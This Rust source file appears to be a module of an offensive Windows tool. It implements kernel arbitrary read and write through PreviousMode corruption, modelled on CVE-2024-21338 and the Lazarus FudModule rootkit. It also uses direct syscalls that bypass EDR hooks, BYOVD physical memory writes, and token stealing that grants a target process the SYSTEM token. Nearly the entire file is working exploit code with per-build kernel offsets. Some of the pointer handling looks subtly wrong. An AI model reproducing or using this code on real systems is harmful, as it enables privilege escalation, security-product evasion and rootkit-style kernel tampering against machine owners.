//! Ring0 Arbitrary R/W Engine (Kernel Memory Access)
//!
//! Techniques:
//! 1. PreviousMode modification - leverage CVE-2024-21338 or similar
//! 2. Direct Syscall - NtReadVirtualMemory/NtWriteVirtualMemory direct invocation
//! 3. Dual mapping - kernel space access via physical memory mapping
//!
//! Reference: Lazarus FudModule rootkit, CVE-2024-21338

use crate::error::MemoricError;
use serde_json::Value;
use std::arch::asm;

/// Kernel access state
#[derive(Debug, Clone)]
pub struct KernelAccessState {
    pub previous_mode_corrupted: bool,
    pub kernel_base: Option<u64>,
    pub kthread_address: Option<u64>,
}

/// Check kernel access capability
pub fn check_kernel_access() -> Result<Value, MemoricError> {
    // Try to get kernel base address
    let kernel_base = get_kernel_base()?;

    // Try to get KTHREAD address (requires PreviousMode exploit)
    let kthread = get_current_kthread();

    Ok(serde_json::json!({
        "kernel_base": format!("0x{:016X}", kernel_base),
        "kthread_address": kthread.map(|a| format!("0x{:016X}", a)),
        "previous_mode_accessible": kthread.is_some(),
        "message": "Kernel access capability checked"
    }))
}

/// Get ntoskrnl.exe base address
fn get_kernel_base() -> Result<u64, MemoricError> {
    // Via NtQuerySystemInformation(SystemModuleInformation)
    unsafe {
        let mut ret_len = 0u32;

        // First call to get required buffer size
        let _ = ntapi::ntexapi::NtQuerySystemInformation(
            11, // SystemModuleInformation
            std::ptr::null_mut(),
            0,
            &mut ret_len,
        );

        if ret_len == 0 {
            return Err(MemoricError::WindowsApi(
                "Failed to get system information size".to_string(),
            ));
        }

        let mut buffer = vec![0u8; ret_len as usize];
        let status = ntapi::ntexapi::NtQuerySystemInformation(
            11,
            buffer.as_mut_ptr() as *mut _,
            ret_len,
            &mut ret_len,
        );

        if status != 0 {
            return Err(MemoricError::WindowsApi(format!(
                "NtQuerySystemInformation failed: 0x{:08X}",
                status
            )));
        }

        // RTL_PROCESS_MODULES 结构:
        // ULONG NumberOfModules;
        // RTL_PROCESS_MODULE_INFORMATION Modules[1];

        let num_modules = *(buffer.as_ptr() as *const u32);
        if num_modules == 0 {
            return Err(MemoricError::Other("No kernel modules found".to_string()));
        }

        // First module is ntoskrnl.exe
        #[repr(C)]
        struct ModuleInfo {
            section: u64,
            mapped_base: *mut u8,
            image_base: *mut u8,
            image_size: u32,
            flags: u32,
            load_order_index: u16,
            init_order_index: u16,
            load_count: u16,
            offset_to_file_name: u8,
            full_path_name: [u8; 256],
        }

        let module =
            &*((buffer.as_ptr() as usize + std::mem::size_of::<u32>()) as *const ModuleInfo);
        let base = module.image_base as u64;

        tracing::debug!("[KERNEL] ntoskrnl.exe base: 0x{:016X}", base);
        Ok(base)
    }
}

/// Get the current thread's KTHREAD address
///
/// Via GS segment register (x64):
/// GS:[0x30] = KPCR
/// KPCR + 0x08 = Current PRCB
/// PRCB + 0x08 = CurrentThread (KTHREAD)
fn get_current_kthread() -> Option<u64> {
    unsafe {
        // Read GS segment base to get KPCR
        let kpcr: u64;
        asm!(
            "mov {}, gs:0x30",
            out(reg) kpcr,
            options(nomem, nostack)
        );

        // KPCR->Prcb->CurrentThread
        let prcb = *(kpcr as *const u64).add(1); // KPCR + 0x08 = Prcb
        let kthread = prcb + 0x08; // Prcb + 0x08 = CurrentThread

        Some(kthread)
    }
}

/// Dynamically resolve a syscall number (SSN) by parsing ntdll.dll exports
fn resolve_ssn(function_name: &str) -> Result<u32, MemoricError> {
    use windows::core::{w, PCSTR};
    use windows::Win32::System::LibraryLoader::{GetModuleHandleW, GetProcAddress};

    unsafe {
        let ntdll = GetModuleHandleW(w!("ntdll.dll"))
            .map_err(|e| MemoricError::WindowsApi(format!("GetModuleHandleW: {}", e)))?;

        let name_cstr = std::ffi::CString::new(function_name)
            .map_err(|_| MemoricError::Other("Invalid function name".to_string()))?;

        let func = GetProcAddress(ntdll, PCSTR(name_cstr.as_ptr() as *const u8))
            .ok_or_else(|| MemoricError::Other(format!("Function {} not found", function_name)))?;

        let ptr = func as *const u8;

        // x64 ntdll Nt* stub pattern:
        // 4C 8B D1           mov r10, rcx
        // B8 XX XX 00 00     mov eax, SSN
        // ...
        if *ptr == 0x4C && *ptr.add(1) == 0x8B && *ptr.add(2) == 0xD1 && *ptr.add(3) == 0xB8 {
            let ssn = u32::from_le_bytes([*ptr.add(4), *ptr.add(5), *ptr.add(6), *ptr.add(7)]);
            return Ok(ssn);
        }

        // Alternative pattern (hooked): check further into the stub
        // Some EDRs hook the beginning, but the SSN is still at offset 4
        if *ptr.add(3) == 0xB8 {
            let ssn = u32::from_le_bytes([*ptr.add(4), *ptr.add(5), *ptr.add(6), *ptr.add(7)]);
            return Ok(ssn);
        }

        Err(MemoricError::Other(format!(
            "Cannot resolve SSN for {}: unexpected stub pattern",
            function_name
        )))
    }
}

/// Direct Syscall - NtReadVirtualMemory
///
/// Bypasses user-mode hooks by directly executing kernel syscall.
/// SSN is dynamically resolved from ntdll.dll.
pub unsafe fn syscall_read_virtual_memory(
    process_handle: isize,
    base_address: *const u8,
    buffer: *mut u8,
    size: usize,
    bytes_read: *mut usize,
) -> i32 {
    // Dynamically resolve SSN for NtReadVirtualMemory
    let ssn = resolve_ssn("NtReadVirtualMemory").unwrap_or(0x003F);

    let status: i32;

    asm!(
        "mov r10, rcx",      // Windows x64 syscall convention: r10 = rcx
        "mov eax, {ssn:e}",
        "syscall",
        ssn = in(reg) ssn,
        in("rcx") process_handle,
        in("rdx") base_address,
        in("r8") buffer,
        in("r9") size,
        lateout("rax") status,
        lateout("r10") _,
        lateout("r11") _,
        options(nomem, nostack)
    );

    status
}

/// Direct Syscall - NtWriteVirtualMemory
pub unsafe fn syscall_write_virtual_memory(
    process_handle: isize,
    base_address: *mut u8,
    buffer: *const u8,
    size: usize,
    bytes_written: *mut usize,
) -> i32 {
    // Dynamically resolve SSN for NtWriteVirtualMemory
    let ssn = resolve_ssn("NtWriteVirtualMemory").unwrap_or(0x003A);

    let status: i32;

    asm!(
        "mov r10, rcx",
        "mov eax, {ssn:e}",
        "syscall",
        ssn = in(reg) ssn,
        in("rcx") process_handle,
        in("rdx") base_address,
        in("r8") buffer,
        in("r9") size,
        lateout("rax") status,
        lateout("r10") _,
        lateout("r11") _,
        options(nomem, nostack)
    );

    status
}

/// Kernel arbitrary read
///
/// Via PreviousMode modification or direct physical memory mapping
///
/// # Safety
/// Extremely dangerous operation, may cause BSOD
pub unsafe fn kernel_arbitrary_read(address: u64, size: usize) -> Result<Vec<u8>, MemoricError> {
    if size > 0x1000 {
        return Err(MemoricError::Other("Read size limited to 4KB".to_string()));
    }

    // 检查地址范围
    if address < 0xFFFF000000000000 {
        return Err(MemoricError::Other(
            "Address does not appear to be kernel space".to_string(),
        ));
    }

    let mut buffer = vec![0u8; size];
    let mut bytes_read = 0usize;

    // Use direct syscall to read kernel memory
    // Note: requires PreviousMode = KernelMode to succeed
    let status = syscall_read_virtual_memory(
        -1isize, // Current process pseudo-handle
        address as *const u8,
        buffer.as_mut_ptr(),
        size,
        &mut bytes_read,
    );

    if status >= 0 {
        // NTSTATUS 成功 >= 0
        buffer.truncate(bytes_read);
        Ok(buffer)
    } else {
        Err(MemoricError::WindowsApi(format!(
            "Kernel read failed: 0x{:08X}",
            status
        )))
    }
}

/// Kernel arbitrary write
///
/// # Safety
/// Extremely dangerous operation, may cause BSOD
pub unsafe fn kernel_arbitrary_write(address: u64, data: &[u8]) -> Result<usize, MemoricError> {
    if data.len() > 0x1000 {
        return Err(MemoricError::Other("Write size limited to 4KB".to_string()));
    }

    if address < 0xFFFF000000000000 {
        return Err(MemoricError::Other(
            "Address does not appear to be kernel space".to_string(),
        ));
    }

    let mut bytes_written = 0usize;

    let status = syscall_write_virtual_memory(
        -1isize,
        address as *mut u8,
        data.as_ptr(),
        data.len(),
        &mut bytes_written,
    );

    if status >= 0 {
        Ok(bytes_written)
    } else {
        Err(MemoricError::WindowsApi(format!(
            "Kernel write failed: 0x{:08X}",
            status
        )))
    }
}

/// PreviousMode exploit
///
/// Core idea: modify KTHREAD.PreviousMode = 0 (KernelMode)
/// This allows the current thread to call NtRead/WriteVirtualMemory in kernel mode.
///
/// Reference: CVE-2024-21338 (Lazarus FudModule)
///
/// # Safety
/// Uses exploit techniques, may cause system instability
pub unsafe fn exploit_previous_mode() -> Result<bool, MemoricError> {
    // Get current KTHREAD
    let kthread = get_current_kthread()
        .ok_or_else(|| MemoricError::Other("Failed to get KTHREAD".to_string()))?;

    // PreviousMode offset (varies by Windows version)
    // Win10 1809: KTHREAD + 0x232
    // Win10 1903+: KTHREAD + 0x1F4
    // Win11: KTHREAD + 0x1F4 or similar

    let previous_mode_offset = get_previous_mode_offset();
    let previous_mode_addr = kthread + previous_mode_offset;

    tracing::warn!(
        "[KERNEL] Attempting PreviousMode corruption at 0x{:016X}",
        previous_mode_addr
    );

    // Try writing via BYOVD physical memory access
    // First, translate the kernel VA to PA
    match super::physical_memory::virtual_to_physical(previous_mode_addr as usize) {
        Ok(pa) => {
            // Read original value
            let original = super::physical_memory::read_physical_memory(pa, 1)?;
            tracing::info!("[KERNEL] Original PreviousMode = {}", original[0]);

            // Write 0 (KernelMode)
            super::physical_memory::write_physical_memory(pa, &[0u8])?;

            tracing::warn!("[KERNEL] PreviousMode set to KernelMode via BYOVD");
            Ok(true)
        }
        Err(_) => Err(MemoricError::Other(
            "PreviousMode exploit requires kernel write primitive. Use BYOVD first.".to_string(),
        )),
    }
}

/// Get PreviousMode field offset
fn get_previous_mode_offset() -> u64 {
    // Return correct offset based on Windows build number
    let build = unsafe {
        let ver = windows::Win32::System::SystemInformation::GetVersion();
        ((ver >> 16) & 0xFFFF) as u64
    };

    match build {
        17763 => 0x232,         // Win10 1809
        18362 | 18363 => 0x1F4, // Win10 1903/1909
        19041..=19045 => 0x1F4, // Win10 2004-22H2
        22000 => 0x1F4,         // Win11 21H2
        22621 | 22631 => 0x1F4, // Win11 22H2/23H2
        26100 => 0x1F4,         // Win11 24H2
        _ => 0x1F4,             // Default
    }
}

/// Escalate target process token to SYSTEM via kernel read/write
///
/// Elevates target process to SYSTEM privilege by:
/// 1. Finding SYSTEM EPROCESS via PsInitialSystemProcess export
/// 2. Reading SYSTEM's Token value
/// 3. Walking ActiveProcessLinks to locate target EPROCESS
/// 4. Writing SYSTEM Token into target EPROCESS.Token
pub unsafe fn kernel_token_escalation(target_pid: u32) -> Result<Value, MemoricError> {
    let kernel_base = get_kernel_base()?;

    let build = get_windows_build();
    let (pid_offset, links_offset, token_offset) = eprocess_offsets(build);

    tracing::warn!(
        "[KERNEL] Token escalation: target_pid={}, build={}, token_ofs=0x{:X}",
        target_pid,
        build,
        token_offset
    );

    // Step 1: Locate PsInitialSystemProcess export in ntoskrnl
    let ps_init_rva = find_kernel_export(kernel_base, "PsInitialSystemProcess")?;
    let ps_init_addr = kernel_base + ps_init_rva;
    tracing::debug!("[KERNEL] PsInitialSystemProcess at 0x{:016X}", ps_init_addr);

    // Step 2: Read the SYSTEM EPROCESS pointer
    let system_eproc_bytes = kernel_arbitrary_read(ps_init_addr, 8).map_err(|e| {
        MemoricError::Other(format!("Failed to read PsInitialSystemProcess: {}", e))
    })?;
    let system_eproc = u64::from_le_bytes(system_eproc_bytes[..8].try_into().unwrap());
    if system_eproc == 0 || system_eproc < 0xFFFF000000000000 {
        return Err(MemoricError::Other(format!(
            "Invalid SYSTEM EPROCESS: 0x{:016X}",
            system_eproc
        )));
    }
    tracing::debug!("[KERNEL] SYSTEM EPROCESS at 0x{:016X}", system_eproc);

    // Step 3: Read SYSTEM Token
    let token_addr = system_eproc + token_offset;
    let token_bytes = kernel_arbitrary_read(token_addr, 8)
        .map_err(|e| MemoricError::Other(format!("Failed to read SYSTEM token: {}", e)))?;
    let system_token = u64::from_le_bytes(token_bytes[..8].try_into().unwrap());
    // Strip RefCnt bits (low 4 bits for EX_FAST_REF)
    let system_token_clean = system_token & !0xF;
    tracing::debug!(
        "[KERNEL] SYSTEM Token: raw=0x{:016X}, clean=0x{:016X}",
        system_token,
        system_token_clean
    );

    // Step 4: Walk ActiveProcessLinks to find target EPROCESS
    let target_eproc = walk_eprocess_list(system_eproc, links_offset, pid_offset, target_pid)?;
    tracing::debug!(
        "[KERNEL] Target PID {} EPROCESS at 0x{:016X}",
        target_pid,
        target_eproc
    );

    // Step 5: Read target's current token (for recovery)
    let target_token_addr = target_eproc + token_offset;
    let old_token_bytes = kernel_arbitrary_read(target_token_addr, 8)
        .map_err(|e| MemoricError::Other(format!("Failed to read target token: {}", e)))?;
    let old_token = u64::from_le_bytes(old_token_bytes[..8].try_into().unwrap());

    // Step 6: Write SYSTEM token into target EPROCESS
    kernel_arbitrary_write(target_token_addr, &system_token.to_le_bytes())
        .map_err(|e| MemoricError::Other(format!("Failed to write SYSTEM token: {}", e)))?;

    // Step 7: Verify the write
    let verify_bytes = kernel_arbitrary_read(target_token_addr, 8)
        .map_err(|_| MemoricError::Other("Token write verification read failed".to_string()))?;
    let verify_token = u64::from_le_bytes(verify_bytes[..8].try_into().unwrap());

    let success = (verify_token & !0xF) == system_token_clean;

    tracing::warn!(
        "[KERNEL] Token escalation {}: PID {} now has SYSTEM token",
        if success { "SUCCESS" } else { "FAILED" },
        target_pid
    );

    Ok(serde_json::json!({
        "success": success,
        "technique": "kernel_token_escalation",
        "target_pid": target_pid,
        "system_eproc": format!("0x{:016X}", system_eproc),
        "target_eproc": format!("0x{:016X}", target_eproc),
        "system_token": format!("0x{:016X}", system_token_clean),
        "old_token": format!("0x{:016X}", old_token),
        "token_offset": format!("0x{:X}", token_offset),
        "windows_build": build,
    }))
}

/// Get Windows build number
fn get_windows_build() -> u32 {
    unsafe {
        let ver = windows::Win32::System::SystemInformation::GetVersion();
        ((ver >> 16) & 0xFFFF) as u32
    }
}

/// EPROCESS field offsets keyed by Windows build range
fn eprocess_offsets(build: u32) -> (u64, u64, u64) {
    // Returns (UniqueProcessId_offset, ActiveProcessLinks_offset, Token_offset)
    match build {
        // Win10 1507-1511
        10240..=10586 => (0x2E8, 0x2F0, 0x358),
        // Win10 1607-1709
        14393..=16299 => (0x2E0, 0x2E8, 0x358),
        // Win10 1803
        17134 => (0x2E0, 0x2E8, 0x358),
        // Win10 1809
        17763 => (0x2E8, 0x2F0, 0x360),
        // Win10 1903-22H2, Win11 21H2-23H2
        18362..=22631 => (0x440, 0x448, 0x4B8),
        // Win11 24H2+
        _ => (0x440, 0x448, 0x4B8),
    }
}

/// Walk the ActiveProcessLinks doubly-linked list to find an EPROCESS by PID
unsafe fn walk_eprocess_list(
    start_eproc: u64,
    links_offset: u64,
    pid_offset: u64,
    target_pid: u32,
) -> Result<u64, MemoricError> {
    let mut current = start_eproc;
    let mut visited = 0u32;
    const MAX_WALK: u32 = 512;

    loop {
        // Read PID at EPROCESS + pid_offset
        let pid_bytes = kernel_arbitrary_read(current + pid_offset, 4)
            .map_err(|_| MemoricError::Other("Failed reading PID during list walk".to_string()))?;
        let pid = u32::from_le_bytes(pid_bytes[..4].try_into().unwrap());

        if pid == target_pid {
            return Ok(current);
        }

        // Read Flink from ActiveProcessLinks
        let links_addr = current + links_offset;
        let flink_bytes = kernel_arbitrary_read(links_addr, 8)
            .map_err(|_| MemoricError::Other("Failed reading ActiveProcessLinks".to_string()))?;
        let flink = u64::from_le_bytes(flink_bytes[..8].try_into().unwrap());

        // Convert back to EPROCESS address (subtract links_offset from LIST_ENTRY addr)
        let next_eproc = flink.wrapping_sub(links_offset);

        if next_eproc == start_eproc || next_eproc == 0 || next_eproc < 0xFFFF000000000000 {
            break; // Looped or invalid
        }

        current = next_eproc;
        visited += 1;
        if visited >= MAX_WALK {
            break;
        }
    }

    Err(MemoricError::Other(format!(
        "PID {} not found in ActiveProcessLinks (walked {} entries)",
        target_pid, visited
    )))
}

/// Find a kernel export's RVA by parsing ntoskrnl's PE export directory
unsafe fn find_kernel_export(kernel_base: u64, name: &str) -> Result<u64, MemoricError> {
    // Read PE DOS header → NT headers → Export Directory
    let dos_bytes = kernel_arbitrary_read(kernel_base, 0x40)
        .map_err(|e| MemoricError::Other(format!("Failed to read DOS header: {}", e)))?;

    let e_lfanew = u32::from_le_bytes(dos_bytes[0x3C..0x40].try_into().unwrap()) as u64;
    if e_lfanew < 0x40 || e_lfanew > 0x1000 {
        return Err(MemoricError::Other(
            "Invalid PE signature offset".to_string(),
        ));
    }

    // Read NT headers (signature + file header + optional header enough for data dirs)
    let nt_bytes = kernel_arbitrary_read(kernel_base + e_lfanew, 0x100)
        .map_err(|e| MemoricError::Other(format!("Failed to read NT headers: {}", e)))?;

    let pe_sig = u32::from_le_bytes(nt_bytes[0..4].try_into().unwrap());
    if pe_sig != 0x00004550 {
        // "PE\0\0"
        return Err(MemoricError::Other("Invalid PE signature".to_string()));
    }

    // Optional header magic determines PE32 vs PE32+
    let opt_magic = u16::from_le_bytes(nt_bytes[0x18..0x1A].try_into().unwrap());
    let export_dir_rva: u32;
    let export_dir_size: u32;
    if opt_magic == 0x020B {
        // PE32+ : data directories start at offset 0x88 in optional header
        export_dir_rva = u32::from_le_bytes(nt_bytes[0x78..0x7C].try_into().unwrap());
        export_dir_size = u32::from_le_bytes(nt_bytes[0x7C..0x80].try_into().unwrap());
    } else {
        // PE32 : data directories start at offset 0x78
        export_dir_rva = u32::from_le_bytes(nt_bytes[0x68..0x6C].try_into().unwrap());
        export_dir_size = u32::from_le_bytes(nt_bytes[0x6C..0x70].try_into().unwrap());
    }

    if export_dir_rva == 0 || export_dir_size == 0 {
        return Err(MemoricError::Other("No export directory".to_string()));
    }

    // Read export directory
    let export_addr = kernel_base + export_dir_rva as u64;
    let edir_bytes = kernel_arbitrary_read(export_addr, 40)
        .map_err(|e| MemoricError::Other(format!("Failed to read export dir: {}", e)))?;

    let num_names = u32::from_le_bytes(edir_bytes[0x18..0x1C].try_into().unwrap());
    let func_rva = u32::from_le_bytes(edir_bytes[0x1C..0x20].try_into().unwrap());
    let name_rva = u32::from_le_bytes(edir_bytes[0x20..0x24].try_into().unwrap());
    let ord_rva = u32::from_le_bytes(edir_bytes[0x24..0x28].try_into().unwrap());

    if num_names == 0 || func_rva == 0 || name_rva == 0 || ord_rva == 0 {
        return Err(MemoricError::Other(
            "Invalid export directory entries".to_string(),
        ));
    }

    let name_table = kernel_base + name_rva as u64;
    let ord_table = kernel_base + ord_rva as u64;
    let func_table = kernel_base + func_rva as u64;

    // Binary search would be more efficient, but linear scan is fine for <2000 exports
    for i in 0..num_names {
        let name_entry_bytes = match kernel_arbitrary_read(name_table + (i * 4) as u64, 4) {
            Ok(b) => b,
            Err(_) => continue,
        };
        let name_entry_rva = u32::from_le_bytes(name_entry_bytes[..4].try_into().unwrap());
        let name_addr = kernel_base + name_entry_rva as u64;

        // Read export name (max 128 bytes)
        let name_bytes = match kernel_arbitrary_read(name_addr, 128) {
            Ok(b) => b,
            Err(_) => continue,
        };
        let export_name = std::ffi::CStr::from_bytes_until_nul(&name_bytes)
            .map(|s| s.to_str().unwrap_or(""))
            .unwrap_or("");

        if export_name == name {
            let ord_bytes = kernel_arbitrary_read(ord_table + (i * 2) as u64, 2)
                .map_err(|_| MemoricError::Other("Failed reading ordinal table".to_string()))?;
            let ordinal = u16::from_le_bytes(ord_bytes[..2].try_into().unwrap());
            let func_bytes = kernel_arbitrary_read(func_table + (ordinal as u64 * 4), 4)
                .map_err(|_| MemoricError::Other("Failed reading function table".to_string()))?;
            let func_rva_val = u32::from_le_bytes(func_bytes[..4].try_into().unwrap());
            return Ok(func_rva_val as u64);
        }
    }

    Err(MemoricError::Other(format!(
        "Export '{}' not found in ntoskrnl",
        name
    )))
}

/// Kernel memory scan
///
/// Search for specific patterns in kernel address space
pub unsafe fn kernel_memory_scan(
    start: u64,
    size: u64,
    pattern: &[u8],
) -> Result<Vec<u64>, MemoricError> {
    let mut matches = Vec::new();
    let chunk_size = 0x1000usize;

    let mut current = start;
    let end = start + size;

    while current < end {
        let to_read = std::cmp::min(chunk_size as u64, end - current) as usize;

        match kernel_arbitrary_read(current, to_read) {
            Ok(data) => {
                for i in 0..data.len().saturating_sub(pattern.len()) {
                    if &data[i..i + pattern.len()] == pattern {
                        matches.push(current + i as u64);
                    }
                }
            }
            Err(_) => {}
        }

        current += chunk_size as u64;
    }

    Ok(matches)
}

/// Read kernel memory via NtWriteVirtualMemory (FudModule trick)
///
/// Principle: swap source and destination parameters.
/// Writing to user buffer = reading from kernel.
pub unsafe fn read_kernel_via_write(
    kernel_address: u64,
    buffer: &mut [u8],
) -> Result<usize, MemoricError> {
    let mut bytes_read = 0usize;

    // FudModule trick:
    // NtWriteVirtualMemory(-1, user_buffer, kernel_address, size, &bytes)
    // This effectively reads from kernel_address into user_buffer

    let status = syscall_write_virtual_memory(
        -1isize,
        buffer.as_mut_ptr(),
        kernel_address as *const u8,
        buffer.len(),
        &mut bytes_read,
    );

    if status >= 0 {
        Ok(bytes_read)
    } else {
        Err(MemoricError::WindowsApi(format!(
            "Read via write failed: 0x{:08X}",
            status
        )))
    }
}
